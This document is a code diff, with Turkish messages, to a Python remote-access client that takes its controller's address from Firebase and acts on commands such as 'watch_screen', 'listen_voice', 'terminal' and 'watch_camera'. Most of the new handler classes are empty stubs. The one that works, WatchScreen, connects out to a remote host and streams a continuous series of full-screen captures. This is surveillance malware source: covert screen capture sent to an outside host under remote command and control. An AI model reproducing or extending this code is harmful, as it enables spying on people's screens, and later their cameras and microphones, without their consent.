@@ -32,8 +32,103 @@ def connect(ip,port,data):
     except:
         return None
 
+class WatchCamera(Thread):
+    def __init__(self):
+        super().__init__()
+
+    def run(self):
+        pass
+
+    def stop(self):
+        pass
+
+    def set_connection_data(self,ip,port):
+        self.ip = ip
+        self.port = port
+
+class Terminal(Thread):
+    def __init__(self):
+        super().__init__()
+
+
+    def run(self):
+        pass
+
+    def stop(self):
+        pass
+
+    def set_connection_data(self,ip,port):
+        self.ip = ip
+        self.port = port
+
+class WatchScreen(Thread):
+    def __init__(self) -> None:
+        super().__init__()
+
+    def run(self) -> None:
+        while True:
+            try:
+                self.soket = socket()
+                self.soket.connect((self.ip, self.port))
+                break
+            except Exception as e:
+                print("Bağlanma denendi, hata: ", e)
+                print("ip ve port: ", self.ip, self.port)
+                sleep(1)
+        while True:
+            image_data = ImageGrab.grab().tobytes()
+            length = len(image_data)
+            self.soket.sendall(bytes(str(length).zfill(10), 'utf-8'))
+            sleep(0.1)
+            self.soket.sendall(image_data)
+            sleep(0.1)
+
+    def stop(self):
+        pass
+
+    def set_connection_data(self,ip,port):
+        self.ip = ip
+        self.port = port
+
+class FileManager(Thread):
+    def __init__(self) -> None:
+        super().__init__()
+
+    def run(self) -> None:
+        pass
+
+    def stop(self):
+        pass
+
+    def set_connection_data(self,ip,port):
+        self.ip = ip
+        self.port = port
+
+class ListenVoice(Thread):
+    def __init__(self) -> None:
+        super().__init__()
+
+    def run(self) -> None:
+        pass
+
+    def stop(self):
+        pass
+
+    def set_connection_data(self,ip,port):
+        self.ip = ip
+        self.port = port
+
 class App:
     def __init__(self) -> None:
+        self.ip = ""
+        self.port = 0
+
+        self.watch_screen_instance = WatchScreen()
+        self.watch_camera_instance = WatchCamera()
+        self.terminal_instance = Terminal()
+        self.file_manager_instance = FileManager()
+        self.listen_voice_instance = ListenVoice()
+
         self.firebase_manager = FirebaseManager()
         while True:
             try:
@@ -49,16 +144,19 @@ class App:
         elif cmd == "refresh":
             os.startfile(sys.argv[0])
             exit()
-        elif cmd == "voice":
-            print("Ses dinleme açılacak")
+        elif cmd == "listen_voice":
+            self.listen_voice_instance.start()
         elif cmd == "terminal":
-            print("Terminal açılacak")
-        elif cmd == "watch":
-            print("Ekran izleme açılacak")
+            self.terminal_instance.start()
+        elif cmd == "watch_screen":
+            if self.watch_screen_instance.is_alive():
+                self.watch_screen_instance.stop()
+                self.watch_screen_instance.join()
+            self.watch_screen_instance.start()
         elif cmd == "file_manager":
-            print("File manager açılacak")
-        elif cmd == "camera":
-            print("Kamera izleme açılacak")
+            self.file_manager_instance.start()
+        elif cmd == "watch_camera":
+            self.watch_camera_instance.start()
         else: 
             print("Yanlış gelen cmd:"+cmd)
             os.startfile(sys.argv[0])
@@ -66,12 +164,25 @@ class App:
 
     def connect(self):
         try:
-            connection_data = self.firebase_manager.get_tree("/socket/default")
-            print("connection data: " + str(connection_data))
-            self.soket = connect(connection_data["ip"],connection_data["port"],__USERSTRING__.ljust(100))
+            if self.set_connection_data():
+                self.soket = connect(self.ip, self.port,__USERSTRING__.ljust(100))
+            else:
+                print("Bağlantı bilgileri alınamadı")
         except Exception as e:
             print("Bağlantı kurulamadı: " + str(e))
             
+    def set_connection_data(self) -> bool:
+        connection_data = self.firebase_manager.get_tree("/socket")
+        if connection_data is None:
+            return False
+        self.ip = connection_data["default"]["ip"]
+        self.port = connection_data["default"]["port"]
+
+        self.watch_camera_instance.set_connection_data(connection_data["watch_camera"]["ip"],connection_data["watch_camera"]["port"])
+        self.watch_screen_instance.set_connection_data(connection_data["watch_screen"]["ip"],connection_data["watch_screen"]["port"])
+        self.terminal_instance.set_connection_data(connection_data["terminal"]["ip"],connection_data["terminal"]["port"])
+        return True
+
 class FirebaseManager:
     service_json_data = { # unique firebase service json data
     "type": "service_account",
@@ -91,7 +202,7 @@ class FirebaseManager:
         # initialize the firebase
         cred = credentials.Certificate(FirebaseManager.service_json_data)
         initialize_app(cred,{"storageBucket":"blank-72b5f.appspot.com"})
-        self.__bucket = storage.bucket()
+        self.__bucket = storage.bucket()        
 
     def get_tree(self,path = "/") -> dict:
         return realtime.reference(path,url=URL).get()
@@ -116,5 +227,7 @@ class FirebaseManager:
                     print("2- Error: "+str(e))
                 sleep(delay)
             return False
+
+
 
 App()
